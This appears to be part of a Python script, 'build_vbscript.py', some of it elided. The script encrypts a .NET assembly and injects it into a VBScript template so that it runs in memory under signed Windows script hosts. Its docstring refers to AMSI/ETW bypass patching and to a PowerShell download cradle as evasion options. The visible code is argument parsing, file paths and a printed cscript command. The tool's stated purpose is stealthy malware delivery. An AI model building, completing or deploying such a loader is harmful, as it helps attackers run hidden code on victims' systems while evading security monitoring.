#!/usr/bin/env python3
"""
build_vbscript.py -- Encrypts a .NET assembly and injects into vbscript_payload.vbs

Generates a .vbs file that:
  ...
  - Runs under cscript.exe / wscript.exe (Microsoft-signed, no disk writes)

Note: Environmental keying not supported in VBS — use PowerShell cradle instead.
Note: AMSI/ETW bypass not in loader; loaded assembly handles patching in its constructor.

Usage:
  python build_vbscript.py <assembly_path> [options] [-- <assembly_args>...]
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="Encrypt a .NET assembly and inject into vbscript_payload.vbs"
    )
    ...
    parser.add_argument("-o", "--output", help="Output .vbs file (default: payload_ready.vbs)")
    parser.add_argument("--template", help="Template .vbs file to use")
    args = parser.parse_args(argv)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = args.template or os.path.join(script_dir, "vbscript_payload.vbs")
    output_path = args.output or os.path.join(script_dir, "output", "payload_ready.vbs")
    ...
    print(f"    cscript //nologo {os.path.basename(output_path)}", file=sys.stderr)
